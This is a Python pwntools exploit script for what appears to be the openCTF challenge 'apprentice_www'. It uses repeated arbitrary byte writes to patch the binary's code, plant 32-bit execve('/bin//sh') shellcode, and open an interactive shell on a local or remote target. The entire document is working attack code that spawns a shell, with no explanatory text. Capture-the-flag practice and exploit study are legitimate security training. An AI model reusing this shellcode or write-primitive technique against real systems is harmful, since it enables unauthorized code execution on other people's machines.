#!/usr/bin/env python

from pwn import *
import sys

def exploit(r):
	r.sendline(str(0x080485da))
	r.sendline(str(0xc2))

	sc_addr = 0x080485db
	sc = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")

	for c in range(len(sc)):
		r.sendline( str(sc_addr+c) )
		r.sendline( str(ord(sc[c])) )

	r.sendline(str(0x08048500))
	r.sendline(str(0))

	r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/openCTF/apprentice_www_9cc7495fae4a9b23db4c7595865af973'])
        print util.proc.pidof(r)
        pause()
        exploit(r)